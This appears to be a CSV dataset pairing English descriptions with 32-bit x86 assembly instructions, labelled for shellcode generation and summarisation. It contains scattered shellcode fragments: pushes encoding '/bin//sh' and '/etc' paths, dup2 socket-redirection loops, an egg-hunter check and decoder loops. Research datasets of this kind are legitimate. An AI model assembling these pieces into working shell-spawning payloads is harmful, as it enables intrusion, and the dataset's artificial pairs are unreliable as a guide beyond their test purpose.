input_text,target_text
ShellCodeGen: add 48 to edx,"add edx, 48"
ShellCodeGen: decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero,loop main_push
ShellCodeGen: move the address of msg1 into eax,"mov eax, msg1"
"ShellCodeSum: cmp eax, ebx",compare eax with ebx
ShellCodeGen: save the effective address of my_table in ebx,"mov ebx, [my_table]"
ShellCodeGen: compare if edx is zero,"cmp edx, 0"
ShellCodeGen: make the syscall to terminate the program,int 80h
ShellCodeGen: push the value 15 onto the stack and point ecx to the stack register,"push 15 \n mov ecx, esp"
ShellCodeSum: var_a db 232,allocate one byte of memory for var_a variable and initialize it to 232
"ShellCodeSum: test eax, eax \n jnz short _parent",jump short to the label _parent if the contents of the eax register is not zero
ShellCodeGen: subtract the contents of esi from the 32-bit integer stored at memory location var2,"sub [var2], esi"
ShellCodeSum: len: equ $-google,declare the len label equal to the size of the google variable
ShellCodeGen: declare the incaddr label,incaddr:
ShellCodeSum: _parent:,define the _parent label
ShellCodeGen: zero out the eax and ebx register,"xor ebx, ebx \n mul ebx"
ShellCodeGen: decrement the contents of the ecx register and jump to the dup2 label if the result is not negative,dec ecx \n jns dup2
ShellCodeGen: perform xor operation between the value stored at the location ecx+116 and bh,"xor [ecx + 116], bh"
ShellCodeSum: push byte 6,push the byte 6 to the stack
ShellCodeGen: move eax into sock_reg,"mov sock_reg, eax"
ShellCodeGen: add 10 to eax,"add eax, 10"
ShellCodeSum: push byte 0x0,push the byte 0x0 onto the stack
"ShellCodeSum: sub byte [esi], 13",subtract 13 from the byte in esi and save the result in esi
ShellCodeSum: len: equ $-shellcode,declare the len label equal to the length of shellcode
"ShellCodeSum: cmp eax, ebx \n jne retry",if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
ShellCodeGen: define stage label,stage:
ShellCodeSum: push 0x6c626174,push 0x6c626174 onto the stack
ShellCodeGen: move the value 672274793 into the ecx register,"mov ecx, 672274793"
ShellCodeGen: add the contents of the local variable stored at ebp-4 into eax,"add eax, [ebp-4]"
"ShellCodeSum: push word 0x632d \n mov edi, esp",push the word 0x632d onto the stack and point the edi register to the stack register
"ShellCodeSum: xor ecx, ecx",initialize ecx to zero
"ShellCodeSum: push edi \n mov ecx, esp",push the contents of the edi register onto the stack and point ecx to the stack register
ShellCodeGen: compare the byte pointed to by eax at this address against zero,"cmp byte [eax], 0"
ShellCodeGen: push the 0x1 onto the stack,push 0x1
"ShellCodeSum: cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
"ShellCodeSum: mov al, 0x6",move 0x6 into al
ShellCodeGen: move hexstr into ecx,"mov ecx, hexstr"
ShellCodeGen: jump short to _load_data label,jmp short _load_data
"ShellCodeSum: test eax, eax \n jnz do_next_accept",if the contents of the eax register is not zero then jump to the label do_next_accept
ShellCodeSum: push 0x74303072,push 0x74303072 onto the stack
ShellCodeSum: push word 0x6f64,push the word 0x6f64 onto the stack
ShellCodeSum: push edi,push the contents of the edi register onto the stack
ShellCodeSum: push dword 0x2f3a2f3a,push the double word 0x2f3a2f3a onto the stack
ShellCodeGen: add 3 to the contents of the ebx register,"add ebx, 3"
"ShellCodeSum: xor ax, ax",zero out ax register
ShellCodeGen: move 8 decimal into edx,"mov edx, 8"
ShellCodeSum: push byte 0x4,push the byte 0x4 onto the stack
"ShellCodeSum: and eax, 3f465456",perform and operation between eax and 3f465456 and save the result in eax
ShellCodeGen: decrement the contents of the cl register and jump to the dup2 label if the result is not negative,dec cl \n jns dup2
ShellCodeSum: variablename1: resb 1,reserve 1 byte for variableName1
ShellCodeSum: jmp two,jump to two
ShellCodeGen: push the 0x66 onto the stack,push 0x66
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov esi, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register
ShellCodeGen: push the dword 0x74652f2f onto the stack,push dword 0x74652f2f
ShellCodeGen: put the syscall 0x30 into the eax register,push byte 0x30 \n pop eax
"ShellCodeSum: push 0x6e69622f \n push 0x7273752f \n mov eax, esp",push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
ShellCodeGen: decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero,loopnz decode
ShellCodeSum: je exit,jump to the exit label if the operands of the above comparison are equals
ShellCodeSum: push 0x68732f2f,push ascii sh// onto stack
"ShellCodeSum: mov eax, 65",make the system call to get the process group
"ShellCodeSum: xchg ecx, edx",exchange ecx with edx
ShellCodeSum: var2 db ?,declare an uninitialized byte labeled var2
